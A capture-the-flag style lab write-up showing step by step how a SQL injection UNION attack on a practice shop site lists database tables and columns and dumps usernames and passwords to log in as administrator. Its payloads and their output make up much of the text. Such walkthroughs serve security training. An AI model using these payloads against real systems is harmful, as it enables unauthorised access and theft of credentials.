# SQL injection UNION attack, retrieving data from other tables

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

    ![](<Images/SQL injection UNION attack, retrieving data from other tables 0.png>)

## Solution

When accessing the website, I tried selecting the `Pets` category and found untrusted data in the URL.

![](<Images/SQL injection UNION attack, retrieving data from other tables 1.png>)

I tried adding a single quote `'` to the payload --> `Pets'`

And as expected, the server returned an error.

```text
Internal Server Error
```

To get the admin account, I need to perform a `UNION` Attack so I can retrieve information from another table. To do that, I first need to find the exact number of columns in the current query.

After using [ORDER BY combined with Binary Search](./Find%20the%20number%20of%20columns%20using%20ORDER%20BY%20and%20binary%20search%20principles.md), I found that the current query has 2 columns.

Next, I check which SQL version the backend is using with the following payload:

```sql
a' UNION SELECT NULL, version() -- -
```

And the response returned:

```text
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

From that, I know the backend is using `PostgreSQL 12.22`, which is very useful information.

---

```text
Note:

Because I did not read the lab description carefully, I missed the fact that the lab already provided the `users` table and the `username` and `password` columns.

If you are interested in manually discovering that information, you can read the Bonus section below. Otherwise, you can skip it and go directly to the LAST STEP.
```
Bonus
---

After knowing the SQL version, I list all tables in the current database through the `information_schema` database.

```sql
a' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
```

And the response returned:

```text
users
products
```

Among the 2 tables above, the `users` table will contain more valuable information.

Next, I list all columns in the `users` table through `information_schema`.

```sql
a' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users' -- -
```

And the response returned:

```text
email
password
username
```

Among the 3 columns above, `username` and `password` are the most interesting.


---

LAST STEP
---
After gathering enough information, I use the final payload:

```sql
a' UNION SELECT username, password FROM users -- -
```

And the response returned:

```text
carlos
lby15tsie2cu4ie7ytfj
administrator
6dvg2wwmsunm47fjaquf
wiener
ynyit20h2kjpmpjp895a
```

--> We now have the admin account:

- username = `administrator`
- password = `6dvg2wwmsunm47fjaquf`

Login with the admin account and the lab is solved!

![](<Images/Lab SQL injection UNION attack, retrieving data from other tables 4.png>)

![](<Images/Lab SQL injection UNION attack, retrieving data from other tables 5.png>)